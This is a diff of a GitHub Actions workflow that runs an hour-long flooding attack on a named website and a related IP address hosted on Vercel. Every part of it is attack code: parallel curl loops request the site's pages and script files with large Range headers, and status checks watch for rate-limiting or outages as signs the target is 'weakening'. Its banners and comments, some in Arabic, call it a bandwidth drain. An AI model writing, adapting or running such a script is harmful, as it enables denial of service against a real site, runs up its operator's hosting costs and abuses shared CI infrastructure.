@@ -1,4 +1,4 @@
-name: 💀 VERCEL DRAIN - 60 MINUTES
+name: 💀 VERCEL DRAIN - HTTPS DIRECT
 
 on:
   workflow_dispatch:
@@ -12,29 +12,21 @@ jobs:
       - name: Install curl
         run: sudo apt update && sudo apt install -y curl
         
-      - name: 🔥 MAXIMUM DRAIN - 60 MINUTES
+      - name: 🔥 DIRECT HTTPS DRAIN
         run: |
-          echo "╔══════════════════════════════════════════════════════════════╗"
-          echo "║     💀 VERCEL DRAIN MODE - 60 MINUTES - MAX INTENSITY 💀     ║"
-          echo "╚══════════════════════════════════════════════════════════════╝"
-          echo ""
-          echo "🎯 Target: flixtn.com"
-          echo "⏱️  Duration: 60 minutes"
-          echo "⚡ Method: Bandwidth exhaustion + Rate limit flooding"
+          echo "💀 DIRECT HTTPS DRAIN - BYPASS REDIRECTS 💀"
           echo ""
           
           END=$((SECONDS + 3600))
           TOTAL=0
-          BANDWIDTH_MB=0
           
-          # 10 أهداف مختلفة لزيادة الضغط
+          # أهداف HTTPS مباشرة
           TARGETS=(
             "https://flixtn.com/"
             "https://flixtn.com/assets/index-DiQY9GeF.css"
             "https://flixtn.com/assets/index-CllXAbrg.js"
             "https://flixtn.com/assets/prod-Bk_YgDXS.js"
             "https://flixtn.com/assets/prod-QfiXFxxq.js"
-            "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"
             "https://flixtn.com/assets/enhancements.js"
             "https://flixtn.com/assets/seasons.js"
             "https://flixtn.com/assets/admin-panel.js"
@@ -42,60 +34,25 @@ jobs:
             "https://216.198.79.65/"
           )
           
-          echo "🔥 DRAIN ENGINES ACTIVATED 🔥"
-          echo ""
-          
           while [ $SECONDS -lt $END ]; do
-            # موجة هجوم على كل الأهداف مع Range header لاستنزاف الباندويث
             for target in "${TARGETS[@]}"; do
-              for i in {1..10}; do
-                # طلب مع Range لتحميل 500KB لكل طلب
+              for i in {1..20}; do
+                # منع الـ redirect
                 curl -s -o /dev/null "$target" \
                   -H "Range: bytes=0-500000" \
-                  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
-                  -H "Cache-Control: no-cache" \
+                  -L \
                   --max-time 3 \
-                  --retry 0 \
-                  2>/dev/null &
-                
-                # طلب عادي إضافي
-                curl -s -o /dev/null "$target" \
-                  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \
-                  --max-time 2 \
                   2>/dev/null &
               done
             done
             
             TOTAL=$((TOTAL + 200))
-            BANDWIDTH_MB=$((BANDWIDTH_MB + 100))
             
-            # عرض الحالة كل 30 ثانية
             if [ $((SECONDS % 30)) -eq 0 ]; then
               ELAPSED=$((SECONDS / 60))
-              REMAINING=$(( (END - SECONDS) / 60 ))
-              
-              # اختبار استجابة الموقع
-              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "https://flixtn.com/" 2>/dev/null)
-              
-              echo "[$ELAPSED min] 🔥 Req: $TOTAL | 💾 ~${BANDWIDTH_MB}MB | 📊 Status: $STATUS | ⏱️ Remaining: ${REMAINING}m"
-              
-              # إذا بدأ الموقع بالضعف
-              if [[ "$STATUS" == "429" ]]; then
-                echo "⚠️  RATE LIMIT HIT! Vercel is throttling!"
-              elif [[ "$STATUS" == "503" ]] || [[ "$STATUS" == "502" ]]; then
-                echo "💀 SERVICE DEGRADED! Target weakening!"
-              fi
+              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -L "https://flixtn.com/" 2>/dev/null)
+              echo "[$ELAPSED min] 🔥 $TOTAL req | 📊 Status: $STATUS"
             fi
             
             sleep 0.2
           done
-          
-          echo ""
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "📊 FINAL STATISTICS:"
-          echo "   Total requests: $TOTAL"
-          echo "   Estimated bandwidth: ~${BANDWIDTH_MB} MB"
-          echo "   Duration: 60 minutes"
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo ""
-          echo "✅ Drain completed. Check target: https://flixtn.com"
